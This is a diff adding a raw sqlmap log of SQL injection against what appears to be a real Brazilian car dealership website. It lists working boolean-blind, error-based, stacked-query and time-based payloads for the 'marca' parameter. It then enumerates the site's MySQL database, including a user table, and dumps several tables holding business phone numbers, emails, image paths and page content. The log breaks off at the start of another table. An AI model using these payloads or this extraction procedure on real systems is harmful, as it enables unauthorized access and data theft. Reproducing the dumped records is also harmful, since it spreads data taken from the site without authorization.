@@ -1,0 +1,820 @@
+sqlmap identified the following injection point(s) with a total of 275 HTTP(s) requests:
+---
+Parameter: marca (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: marca=29 AND 7596=7596
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: marca=29 AND (SELECT 1832 FROM(SELECT COUNT(*),CONCAT(0x7162706b71,(SELECT (ELT(1832=1832,1))),0x7171787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: marca=29;SELECT SLEEP(5)#
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: marca=29 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] andreive_bd
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: marca (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: marca=29 AND 7596=7596
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: marca=29 AND (SELECT 1832 FROM(SELECT COUNT(*),CONCAT(0x7162706b71,(SELECT (ELT(1832=1832,1))),0x7171787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: marca=29;SELECT SLEEP(5)#
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: marca=29 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: andreive_bd
+[14 tables]
++-------------------+
+| tbl_categorias    |
+| tbl_contato       |
+| tbl_imagens       |
+| tbl_img_galerias  |
+| tbl_links         |
+| tbl_mapa          |
+| tbl_noticias      |
+| tbl_scripts       |
+| tbl_seo           |
+| tbl_slides        |
+| tbl_subcategorias |
+| tbl_textos        |
+| tbl_usuario       |
+| tbl_veiculos      |
++-------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: marca (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: marca=29 AND 7596=7596
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: marca=29 AND (SELECT 1832 FROM(SELECT COUNT(*),CONCAT(0x7162706b71,(SELECT (ELT(1832=1832,1))),0x7171787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: marca=29;SELECT SLEEP(5)#
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: marca=29 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: andreive_bd
+[14 tables]
++-------------------+
+| tbl_categorias    |
+| tbl_contato       |
+| tbl_imagens       |
+| tbl_img_galerias  |
+| tbl_links         |
+| tbl_mapa          |
+| tbl_noticias      |
+| tbl_scripts       |
+| tbl_seo           |
+| tbl_slides        |
+| tbl_subcategorias |
+| tbl_textos        |
+| tbl_usuario       |
+| tbl_veiculos      |
++-------------------+
+
+Database: andreive_bd
+Table: tbl_categorias
+[14 entries]
++----+-----------------+
+| id | categoria       |
++----+-----------------+
+| 5  | GM - Chevrolet  |
+| 6  | Honda           |
+| 7  | Toyota          |
+| 9  | Volkswagen      |
+| 10 | FIAT            |
+| 11 | Renault         |
+| 13 | Ford            |
+| 21 | Hyundai         |
+| 24 | HONDA           |
+| 25 | Nissan          |
+| 26 | Sea-Doo         |
+| 27 | Mercedes-Benz   |
+| 28 | Volvo           |
+| 29 | CITROEN         |
++----+-----------------+
+
+Database: andreive_bd
+Table: tbl_contato
+[10 entries]
++----+---------------+--------------------------------------------+------------+
+| id | tipo          | texto                                      | observacao |
++----+---------------+--------------------------------------------+------------+
+| 1  | Endere\xe7o   | Av. Coronel Antônio Lehmkuhl, 1250, Centro | <blank>    |
+| 2  | Cidade        | Águas Mornas / SC                          | <blank>    |
+| 3  | Telefone      | (48) 3245-8316                             | <blank>    |
+| 4  | Email         | andreiveiculos@hotmail.com                 | <blank>    |
+| 5  | WhatsApp      | (48) 9 9149-1141                           | <blank>    |
+| 6  | Link Facebook | https://www.facebook.com/andreiveiculos    | Se         |
+| 7  | Skype         | <blank>                                    | <blank>    |
+| 8  | Email Contato | andreiveiculos@hotmail.com                 | NULL       |
+| 9  | Instagram     | andreiveiculos                             | <blank>    |
+| 10 | WhatsApp 2    | (48) 9 9151-1141                           | NULL       |
++----+---------------+--------------------------------------------+------------+
+
+Database: andreive_bd
+Table: tbl_imagens
+[10 entries]
++----+-----------------+-----------------+--------------------------------+---------------------------------------+
+| id | alt             | title           | imagem                         | observacao                            |
++----+-----------------+-----------------+--------------------------------+---------------------------------------+
+| 1  | Andrei Veículos | Andrei Veículos | midias/imagens/14543569321.png | Logo                                  |
+| 2  | Andrei Veículos | Andrei Veículos | midias/imagens/14543567471.png | OGG Image - Compartilhamento Facebook |
+| 3  | Favicon         | Favicon         | midias/imagens/14543568291.png | Favicon                               |
+| 4  | Andrei Veículos | Andrei Veículos | midias/imagens/14543568541.png | Logo Footer                           |
+| 5  | Imagem Sobre    | Imagem Sobre    | midias/imagens/14605661231.jpg | Imagem Sobre                          |
+| 6  | Imagem Fundo    | Imagem Fundo    | midias/imagens/14618515111.png | Imagem Fundo                          |
+| 7  | Fundo Multas    | Fundo Multas    | midias/imagens/14618516401.png | Fundo Multas                          |
+| 8  | Fundo Contato   | Fundo Contato   | midias/imagens/14618517041.png | Fundo Contato                         |
+| 9  | Fundo Noticias  | Fundo Noticias  | midias/imagens/14618518381.png | Fundo Noticias                        |
+| 10 | Fundo Veiculos  | Fundo Veiculos  | midias/imagens/14618518591.png | Fundo Veiculos                        |
++----+-----------------+-----------------+--------------------------------+---------------------------------------+
+
+Database: andreive_bd
+Table: tbl_img_galerias
+[211 entries]
++------+-----------------+---------------------------------+---------+
+| id   | nome            | imagem                          | galeria |
++------+-----------------+---------------------------------+---------+
+| 4    | Imagem 1        | midias/galerias/14229126971.png | 4       |
+| 5    | Imagem 2        | midias/galerias/14229127051.png | 4       |
+| 8146 | Andrei Veiculos | midias/galerias/1527112184.jpg  | 395     |
+| 8147 | Andrei Veiculos | midias/galerias/1527112186.jpg  | 395     |
+| 8148 | Andrei Veiculos | midias/galerias/1527112188.jpg  | 395     |
+| 8149 | Andrei Veiculos | midias/galerias/1527112190.jpg  | 395     |
+| 8150 | Andrei Veiculos | midias/galerias/1527112193.jpg  | 395     |
+| 8151 | Andrei Veiculos | midias/galerias/1527112196.jpg  | 395     |
+| 8152 | Andrei Veiculos | midias/galerias/1527112197.jpg  | 395     |
+| 8153 | Andrei Veiculos | midias/galerias/1527112199.jpg  | 395     |
+| 8154 | Andrei Veiculos | midias/galerias/1527112200.jpg  | 395     |
+| 8155 | Andrei Veiculos | midias/galerias/1527112201.jpg  | 395     |
+| 8156 | Andrei Veiculos | midias/galerias/1527112202.jpg  | 395     |
+| 8157 | Andrei Veiculos | midias/galerias/1527112205.jpg  | 395     |
+| 8158 | Andrei Veiculos | midias/galerias/1527112205.jpg  | 395     |
+| 8159 | Andrei Veiculos | midias/galerias/1527112207.jpg  | 395     |
+| 8160 | Andrei Veiculos | midias/galerias/1527112208.jpg  | 395     |
+| 8161 | Andrei Veiculos | midias/galerias/1527112209.jpg  | 395     |
+| 8162 | Andrei Veiculos | midias/galerias/1527112210.jpg  | 395     |
+| 8163 | Andrei Veiculos | midias/galerias/1527112212.jpg  | 395     |
+| 8164 | Andrei Veiculos | midias/galerias/1527112213.jpg  | 395     |
+| 8315 | Andrei Veiculos | midias/galerias/1528553819.jpg  | 403     |
+| 8316 | Andrei Veiculos | midias/galerias/1528553820.jpg  | 403     |
+| 8317 | Andrei Veiculos | midias/galerias/1528553821.jpg  | 403     |
+| 8318 | Andrei Veiculos | midias/galerias/1528553823.jpg  | 403     |
+| 8319 | Andrei Veiculos | midias/galerias/1528553824.jpg  | 403     |
+| 8320 | Andrei Veiculos | midias/galerias/1528553826.jpg  | 403     |
+| 8321 | Andrei Veiculos | midias/galerias/1528553828.jpg  | 403     |
+| 8322 | Andrei Veiculos | midias/galerias/1528553828.jpg  | 403     |
+| 8323 | Andrei Veiculos | midias/galerias/1528553832.jpg  | 403     |
+| 8324 | Andrei Veiculos | midias/galerias/1528553833.jpg  | 403     |
+| 8325 | Andrei Veiculos | midias/galerias/1528553835.jpg  | 403     |
+| 8326 | Andrei Veiculos | midias/galerias/1528553836.jpg  | 403     |
+| 8327 | Andrei Veiculos | midias/galerias/1528553838.jpg  | 403     |
+| 8328 | Andrei Veiculos | midias/galerias/1528553840.jpg  | 403     |
+| 8329 | Andrei Veiculos | midias/galerias/1528553840.jpg  | 403     |
+| 8330 | Andrei Veiculos | midias/galerias/1528553842.jpg  | 403     |
+| 8331 | Andrei Veiculos | midias/galerias/1528553843.jpg  | 403     |
+| 8332 | Andrei Veiculos | midias/galerias/1528553844.jpg  | 403     |
+| 8333 | Andrei Veiculos | midias/galerias/1528553847.jpg  | 403     |
+| 8390 | Andrei Veiculos | midias/galerias/1529442622.jpg  | 407     |
+| 8391 | Andrei Veiculos | midias/galerias/1529442623.jpg  | 407     |
+| 8392 | Andrei Veiculos | midias/galerias/1529442625.jpg  | 407     |
+| 8393 | Andrei Veiculos | midias/galerias/1529442626.jpg  | 407     |
+| 8394 | Andrei Veiculos | midias/galerias/1529442628.jpg  | 407     |
+| 8395 | Andrei Veiculos | midias/galerias/1529442628.jpg  | 407     |
+| 8396 | Andrei Veiculos | midias/galerias/1529442630.jpg  | 407     |
+| 8397 | Andrei Veiculos | midias/galerias/1529442631.jpg  | 407     |
+| 8398 | Andrei Veiculos | midias/galerias/1529442632.jpg  | 407     |
+| 8399 | Andrei Veiculos | midias/galerias/1529442633.jpg  | 407     |
+| 8400 | Andrei Veiculos | midias/galerias/1529442633.jpg  | 407     |
+| 8401 | Andrei Veiculos | midias/galerias/1529442635.jpg  | 407     |
+| 8402 | Andrei Veiculos | midias/galerias/1529442635.jpg  | 407     |
+| 8403 | Andrei Veiculos | midias/galerias/1529442637.jpg  | 407     |
+| 8404 | Andrei Veiculos | midias/galerias/1529442638.jpg  | 407     |
+| 8405 | Andrei Veiculos | midias/galerias/1529442640.jpg  | 407     |
+| 8406 | Andrei Veiculos | midias/galerias/1529442640.jpg  | 407     |
+| 8407 | Andrei Veiculos | midias/galerias/1529442642.jpg  | 407     |
+| 8408 | Andrei Veiculos | midias/galerias/1529442642.jpg  | 407     |
+| 8466 | Andrei Veiculos | midias/galerias/1530189207.jpg  | 411     |
+| 8467 | Andrei Veiculos | midias/galerias/1530189207.jpg  | 411     |
+| 8468 | Andrei Veiculos | midias/galerias/1530189209.jpg  | 411     |
+| 8469 | Andrei Veiculos | midias/galerias/1530189209.jpg  | 411     |
+| 8470 | Andrei Veiculos | midias/galerias/1530189211.jpg  | 411     |
+| 8471 | Andrei Veiculos | midias/galerias/1530189211.jpg  | 411     |
+| 8472 | Andrei Veiculos | midias/galerias/1530189213.jpg  | 411     |
+| 8473 | Andrei Veiculos | midias/galerias/1530189214.jpg  | 411     |
+| 8474 | Andrei Veiculos | midias/galerias/1530189216.jpg  | 411     |
+| 8475 | Andrei Veiculos | midias/galerias/1530189217.jpg  | 411     |
+| 8476 | Andrei Veiculos | midias/galerias/1530189220.jpg  | 411     |
+| 8477 | Andrei Veiculos | midias/galerias/1530189220.jpg  | 411     |
+| 8478 | Andrei Veiculos | midias/galerias/1530189221.jpg  | 411     |
+| 8479 | Andrei Veiculos | midias/galerias/1530189222.jpg  | 411     |
+| 8480 | Andrei Veiculos | midias/galerias/1530189225.jpg  | 411     |
+| 8481 | Andrei Veiculos | midias/galerias/1530189226.jpg  | 411     |
+| 8482 | Andrei Veiculos | midias/galerias/1530189227.jpg  | 411     |
+| 8483 | Andrei Veiculos | midias/galerias/1530189228.jpg  | 411     |
+| 8484 | Andrei Veiculos | midias/galerias/1530189230.jpg  | 411     |
+| 8769 | Andrei Veiculos | midias/galerias/1533229676.jpg  | 428     |
+| 8770 | Andrei Veiculos | midias/galerias/1533229678.jpg  | 428     |
+| 8771 | Andrei Veiculos | midias/galerias/1533229679.jpg  | 428     |
+| 8772 | Andrei Veiculos | midias/galerias/1533229680.jpg  | 428     |
+| 8773 | Andrei Veiculos | midias/galerias/1533229682.jpg  | 428     |
+| 8774 | Andrei Veiculos | midias/galerias/1533229683.jpg  | 428     |
+| 8775 | Andrei Veiculos | midias/galerias/1533229685.jpg  | 428     |
+| 8776 | Andrei Veiculos | midias/galerias/1533229686.jpg  | 428     |
+| 8777 | Andrei Veiculos | midias/galerias/1533229687.jpg  | 428     |
+| 8778 | Andrei Veiculos | midias/galerias/1533229689.jpg  | 428     |
+| 8779 | Andrei Veiculos | midias/galerias/1533229689.jpg  | 428     |
+| 8780 | Andrei Veiculos | midias/galerias/1533229696.jpg  | 428     |
+| 8781 | Andrei Veiculos | midias/galerias/1533229698.jpg  | 428     |
+| 8782 | Andrei Veiculos | midias/galerias/1533229698.jpg  | 428     |
+| 8783 | Andrei Veiculos | midias/galerias/1533229700.jpg  | 428     |
+| 8784 | Andrei Veiculos | midias/galerias/1533229701.jpg  | 428     |
+| 8785 | Andrei Veiculos | midias/galerias/1533229702.jpg  | 428     |
+| 8786 | Andrei Veiculos | midias/galerias/1533229702.jpg  | 428     |
+| 8787 | Andrei Veiculos | midias/galerias/1533229703.jpg  | 428     |
+| 9077 | Andrei Veiculos | midias/galerias/1535207408.jpg  | 447     |
+| 9078 | Andrei Veiculos | midias/galerias/1535207409.jpg  | 447     |
+| 9079 | Andrei Veiculos | midias/galerias/1535207411.jpg  | 447     |
+| 9080 | Andrei Veiculos | midias/galerias/1535207411.jpg  | 447     |
+| 9081 | Andrei Veiculos | midias/galerias/1535207414.jpg  | 447     |
+| 9082 | Andrei Veiculos | midias/galerias/1535207415.jpg  | 447     |
+| 9083 | Andrei Veiculos | midias/galerias/1535207416.jpg  | 447     |
+| 9084 | Andrei Veiculos | midias/galerias/1535207418.jpg  | 447     |
+| 9085 | Andrei Veiculos | midias/galerias/1535207420.jpg  | 447     |
+| 9086 | Andrei Veiculos | midias/galerias/1535207423.jpg  | 447     |
+| 9087 | Andrei Veiculos | midias/galerias/1535207423.jpg  | 447     |
+| 9088 | Andrei Veiculos | midias/galerias/1535207455.jpg  | 447     |
+| 9089 | Andrei Veiculos | midias/galerias/1535207457.jpg  | 447     |
+| 9090 | Andrei Veiculos | midias/galerias/1535207459.jpg  | 447     |
+| 9091 | Andrei Veiculos | midias/galerias/1535207460.jpg  | 447     |
+| 9092 | Andrei Veiculos | midias/galerias/1535207462.jpg  | 447     |
+| 9093 | Andrei Veiculos | midias/galerias/1535207463.jpg  | 447     |
+| 9094 | Andrei Veiculos | midias/galerias/1535207465.jpg  | 447     |
+| 9095 | Andrei Veiculos | midias/galerias/1535207465.jpg  | 447     |
+| 9383 | Andrei Veiculos | midias/galerias/1539289847.jpg  | 463     |
+| 9384 | Andrei Veiculos | midias/galerias/1539289850.jpg  | 463     |
+| 9385 | Andrei Veiculos | midias/galerias/1539289851.jpg  | 463     |
+| 9386 | Andrei Veiculos | midias/galerias/1539289851.jpg  | 463     |
+| 9387 | Andrei Veiculos | midias/galerias/1539289853.jpg  | 463     |
+| 9388 | Andrei Veiculos | midias/galerias/1539289854.jpg  | 463     |
+| 9389 | Andrei Veiculos | midias/galerias/1539289855.jpg  | 463     |
+| 9390 | Andrei Veiculos | midias/galerias/1539289856.jpg  | 463     |
+| 9391 | Andrei Veiculos | midias/galerias/1539289857.jpg  | 463     |
+| 9392 | Andrei Veiculos | midias/galerias/1539289858.jpg  | 463     |
+| 9393 | Andrei Veiculos | midias/galerias/1539289860.jpg  | 463     |
+| 9394 | Andrei Veiculos | midias/galerias/1539289860.jpg  | 463     |
+| 9395 | Andrei Veiculos | midias/galerias/1539289861.jpg  | 463     |
+| 9396 | Andrei Veiculos | midias/galerias/1539289861.jpg  | 463     |
+| 9397 | Andrei Veiculos | midias/galerias/1539289862.jpg  | 463     |
+| 9398 | Andrei Veiculos | midias/galerias/1539289872.jpg  | 463     |
+| 9399 | Andrei Veiculos | midias/galerias/1539289874.jpg  | 463     |
+| 9400 | Andrei Veiculos | midias/galerias/1539289875.jpg  | 463     |
+| 9401 | Andrei Veiculos | midias/galerias/1539289875.jpg  | 463     |
+| 9421 | Andrei Veiculos | midias/galerias/1540048324.jpg  | 465     |
+| 9422 | Andrei Veiculos | midias/galerias/1540048327.jpg  | 465     |
+| 9423 | Andrei Veiculos | midias/galerias/1540048327.jpg  | 465     |
+| 9424 | Andrei Veiculos | midias/galerias/1540048329.jpg  | 465     |
+| 9425 | Andrei Veiculos | midias/galerias/1540048329.jpg  | 465     |
+| 9426 | Andrei Veiculos | midias/galerias/1540048331.jpg  | 465     |
+| 9427 | Andrei Veiculos | midias/galerias/1540048332.jpg  | 465     |
+| 9428 | Andrei Veiculos | midias/galerias/1540048333.jpg  | 465     |
+| 9429 | Andrei Veiculos | midias/galerias/1540048334.jpg  | 465     |
+| 9430 | Andrei Veiculos | midias/galerias/1540048335.jpg  | 465     |
+| 9431 | Andrei Veiculos | midias/galerias/1540048336.jpg  | 465     |
+| 9432 | Andrei Veiculos | midias/galerias/1540048337.jpg  | 465     |
+| 9433 | Andrei Veiculos | midias/galerias/1540048337.jpg  | 465     |
+| 9434 | Andrei Veiculos | midias/galerias/1540048339.jpg  | 465     |
+| 9435 | Andrei Veiculos | midias/galerias/1540048340.jpg  | 465     |
+| 9436 | Andrei Veiculos | midias/galerias/1540048341.jpg  | 465     |
+| 9437 | Andrei Veiculos | midias/galerias/1540048342.jpg  | 465     |
+| 9438 | Andrei Veiculos | midias/galerias/1540048342.jpg  | 465     |
+| 9439 | Andrei Veiculos | midias/galerias/1540048343.jpg  | 465     |
+| 9458 | Andrei Veiculos | midias/galerias/1540048779.jpg  | 467     |
+| 9459 | Andrei Veiculos | midias/galerias/1540048781.jpg  | 467     |
+| 9460 | Andrei Veiculos | midias/galerias/1540048783.jpg  | 467     |
+| 9461 | Andrei Veiculos | midias/galerias/1540048785.jpg  | 467     |
+| 9462 | Andrei Veiculos | midias/galerias/1540048785.jpg  | 467     |
+| 9463 | Andrei Veiculos | midias/galerias/1540048786.jpg  | 467     |
+| 9464 | Andrei Veiculos | midias/galerias/1540048788.jpg  | 467     |
+| 9465 | Andrei Veiculos | midias/galerias/1540048790.jpg  | 467     |
+| 9466 | Andrei Veiculos | midias/galerias/1540048790.jpg  | 467     |
+| 9467 | Andrei Veiculos | midias/galerias/1540048792.jpg  | 467     |
+| 9468 | Andrei Veiculos | midias/galerias/1540048793.jpg  | 467     |
+| 9469 | Andrei Veiculos | midias/galerias/1540048795.jpg  | 467     |
+| 9470 | Andrei Veiculos | midias/galerias/1540048795.jpg  | 467     |
+| 9471 | Andrei Veiculos | midias/galerias/1540048798.jpg  | 467     |
+| 9472 | Andrei Veiculos | midias/galerias/1540048799.jpg  | 467     |
+| 9473 | Andrei Veiculos | midias/galerias/1540048800.jpg  | 467     |
+| 9474 | Andrei Veiculos | midias/galerias/1540048801.jpg  | 467     |
+| 9475 | Andrei Veiculos | midias/galerias/1540048802.jpg  | 467     |
+| 9476 | Andrei Veiculos | midias/galerias/1540048802.jpg  | 467     |
+| 9571 | Andrei Veiculos | midias/galerias/1542214300.jpg  | 474     |
+| 9572 | Andrei Veiculos | midias/galerias/1542214301.jpg  | 474     |
+| 9573 | Andrei Veiculos | midias/galerias/1542214302.jpg  | 474     |
+| 9574 | Andrei Veiculos | midias/galerias/1542214302.jpg  | 474     |
+| 9575 | Andrei Veiculos | midias/galerias/1542214304.jpg  | 474     |
+| 9576 | Andrei Veiculos | midias/galerias/1542214305.jpg  | 474     |
+| 9577 | Andrei Veiculos | midias/galerias/1542214306.jpg  | 474     |
+| 9578 | Andrei Veiculos | midias/galerias/1542214307.jpg  | 474     |
+| 9579 | Andrei Veiculos | midias/galerias/1542214308.jpg  | 474     |
+| 9580 | Andrei Veiculos | midias/galerias/1542214309.jpg  | 474     |
+| 9581 | Andrei Veiculos | midias/galerias/1542214310.jpg  | 474     |
+| 9582 | Andrei Veiculos | midias/galerias/1542214312.jpg  | 474     |
+| 9583 | Andrei Veiculos | midias/galerias/1542214312.jpg  | 474     |
+| 9584 | Andrei Veiculos | midias/galerias/1542214313.jpg  | 474     |
+| 9585 | Andrei Veiculos | midias/galerias/1542214315.jpg  | 474     |
+| 9586 | Andrei Veiculos | midias/galerias/1542214315.jpg  | 474     |
+| 9587 | Andrei Veiculos | midias/galerias/1542214317.jpg  | 474     |
+| 9588 | Andrei Veiculos | midias/galerias/1542214318.jpg  | 474     |
+| 9628 | Andrei Veiculos | midias/galerias/1543952463.jpg  | 479     |
+| 9629 | Andrei Veiculos | midias/galerias/1543952463.jpg  | 479     |
+| 9630 | Andrei Veiculos | midias/galerias/1543952464.jpg  | 479     |
+| 9631 | Andrei Veiculos | midias/galerias/1543952466.jpg  | 479     |
+| 9632 | Andrei Veiculos | midias/galerias/1543952469.jpg  | 479     |
+| 9633 | Andrei Veiculos | midias/galerias/1543952471.jpg  | 479     |
+| 9634 | Andrei Veiculos | midias/galerias/1543952481.jpg  | 479     |
+| 9635 | Andrei Veiculos | midias/galerias/1543952484.jpg  | 479     |
+| 9636 | Andrei Veiculos | midias/galerias/1543952486.jpg  | 479     |
+| 9637 | Andrei Veiculos | midias/galerias/1543952495.jpg  | 479     |
+| 9638 | Andrei Veiculos | midias/galerias/1543952498.jpg  | 479     |
+| 9958 | Andrei Veiculos | midias/galerias/1548786475.jpg  | 497     |
+| 9959 | Andrei Veiculos | midias/galerias/1548786477.jpg  | 497     |
+| 9960 | Andrei Veiculos | midias/galerias/1548786479.jpg  | 497     |
+| 9961 | Andrei Veiculos | midias/galerias/1548786481.jpg  | 497     |
+| 9962 | Andrei Veiculos | midias/galerias/1548786482.jpg  | 497     |
+| 9963 | Andrei Veiculos | midias/galerias/1548786483.jpg  | 497     |
+| 9964 | Andrei Veiculos | midias/galerias/1548786484.jpg  | 497     |
+| 9965 | Andrei Veiculos | midias/galerias/1548786487.jpg  | 497     |
+| 9966 | Andrei Veiculos | midias/galerias/1548786488.jpg  | 497     |
++------+-----------------+---------------------------------+---------+
+
+Database: andreive_bd
+Table: tbl_links
+[14 entries]
++----+----------------------+-----------+
+| id | link                 | nome      |
++----+----------------------+-----------+
+| 10 | www.detran.ba.gov.br | Detran BA |
+| 11 | www.detran.df.gov.br | Detran DF |
+| 12 | www.detran.es.gov.br | Detran ES |
+| 13 | www.detran.mg.gov.br | Detran MG |
+| 14 | www.detran.ms.gov.br | Detran MS |
+| 15 | www.detran.pa.gov.br | Detran PA |
+| 16 | www.detran.pb.gov.br | Detran PB |
+| 17 | www.detran.pe.gov.br | Detran PE |
+| 18 | www.detran.pr.gov.br | Detran PR |
+| 19 | www.detran.rj.gov.br | Detran RJ |
+| 20 | www.detran.rn.gov.br | Detran RN |
+| 21 | www.detran.rs.gov.br | Detran RS |
+| 22 | www.detran.sc.gov.br | Detran SC |
+| 23 | www.detran.sp.gov.br | Detran SP |
++----+----------------------+-----------+
+
+Database: andreive_bd
+Table: tbl_mapa
+[1 entry]
++----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | codigo                                                                                                                                                                                                                 |
++----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1766.3496560205008!2d-48.8233349994722!3d-27.695686886352142!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0000000000000000:0x7cd202db18dee21 |
++----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: andreive_bd
+Table: tbl_noticias
+[5 entries]
++-----+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------+----------------------------------------------------------+-------------------------------------------------------+----------+
+| id  | data       | texto                                                                                                                                                                                                                                                                      | imagem                          | resumo                                                   | titulo                                                | destaque |
++-----+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------+----------------------------------------------------------+-------------------------------------------------------+----------+
+| 157 | 02/02/2016 | <p><span style="font-size:14px">A Comiss\xe3o Esta                                                                                                                                                                                                                         | midias/noticias/14544403301.jpg | Em 2015, foram leiloados no total 16.608 veículos, se    | Detran/SC espera realizar pelo menos 22 leilões em 20 | 0        |
+| 158 | 02/02/2016 | <p>Para acesar o simulado acesse:\xa0<a href="https:                                                                                                                                                                                                                       | midias/noticias/14544409811.jpg | Simulado Detran/SC                                       | Detran/SC disponibiliza simulado da Prova teórica     | 0        |
+| 159 | 02/02/2016 | <div style="margin: 0px; border: 0px; padding: 0px; color: rgb(0, 0, 0); font-family: Arial; font-size: 12px; line-height: 20px;"><span style="font-size:14px"><span style="font-family:arial,helvetica,sans-serif">Entrou em vigor no in\xedcio deste ano a portaria do D | midias/noticias/14544425321.jpg | Órgão                                                    | Detran/SC estabelece novos parâmetros                 | 0        |
+| 160 | 25/10/2016 | <p>http://www.icarros.com.br/noticias/geral/multas-ficarao-mais-caras-a-partir-de-novembro/20816.html</p>\r\n                                                                                                                                                              | midias/noticias/14774111801.jpg | Usar o celular enquanto dirige ou estacionar em vagas de | Multas ficarão mais caras a partir de novembro        | 0        |
+| 161 | 25/10/2016 | http://www.msn.com/pt-br/carros/servicos-e-manutencao/lei-por-dirigir-sem-o-documento-do-veículo-muda-e                                                                                                                                                                    | midias/noticias/14774113431.jpg | Além de alterar os limites de velocidade em estradas     | Lei por dirigir sem o documento do veículo muda em no | 0        |
++-----+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------+----------------------------------------------------------+-------------------------------------------------------+----------+
+
+Database: andreive_bd
+Table: tbl_scripts
+[1 entry]
++----+------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | titulo           | codigo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
++----+------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Todas as páginas | <!-- WhatsHelp.io widget -->\r\n<script type="text/javascript">\r\n(function () {\r\nvar options = {\r\nwhatsapp: "5548991491141", // WhatsApp number\r\ncall_to_action: "Fale Conosco", // Call to action\r\nposition: "right", // Position may be 'right' or 'left'\r\n};\r\nvar proto = document.location.protocol, host = "whatshelp.io", url = proto + "//static." + host;\r\nvar s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';\r\ns.onload = function () { WhWidgetSendButton.init(host, proto, options); };\r\nvar x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);\r\n})();\r\n</script>\r\n<!-- /WhatsHelp.io widget --> |
++----+------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: andreive_bd
+Table: tbl_seo
+[12 entries]
++----+---------------------+----------------------------------------+
